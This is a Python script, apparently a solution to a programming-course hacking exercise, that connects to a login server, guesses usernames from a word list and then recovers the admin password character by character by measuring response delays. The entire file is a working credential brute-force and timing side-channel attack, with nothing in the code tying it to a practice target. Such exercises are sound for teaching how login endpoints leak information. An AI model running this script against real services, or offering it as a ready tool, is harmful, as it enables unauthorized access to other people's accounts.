# write your code here
import argparse
import json
import socket
import string
import time

parser = argparse.ArgumentParser()

parser.add_argument('ip')
parser.add_argument('port')

args = parser.parse_args()


def find_login(my_socket):
    with open('logins.txt', 'r') as login_file:
        for login in login_file:
            login = login.strip()
            data = json.dumps({"login": login, "password": " "}, indent=4)
            my_socket.send(data.encode())

            response = my_socket.recv(1024)

            response_dict = json.loads(response.decode())
            if response_dict['result'] == 'Wrong password!':
                return login
    return 'login not found'


def find_password(my_socket, admin_login):
    alphanum = string.ascii_letters + string.digits
    password = ''
    index = 0
    while True:
        for character in alphanum:

            password = password[:index] + character
            credential = {"login": admin_login, "password": password}
            cred_json = json.dumps(credential, indent=4)

            my_socket.send(cred_json.encode())

            start = time.perf_counter()
            response = my_socket.recv(1024)
            end = time.perf_counter()
            
            response_dict = json.loads(response.decode())

            if response_dict['result'] == 'Connection success!':
                return cred_json

            elif response_dict['result'] == 'Wrong password!' and (end - start) >= 0.09:
                index += 1
                break


def main():
    with socket.socket() as client:
        client.connect((args.ip, int(args.port)))

        correct_login = find_login(client)
        credentials = find_password(client, correct_login)

    print(credentials)


if __name__ == '__main__':
    main()
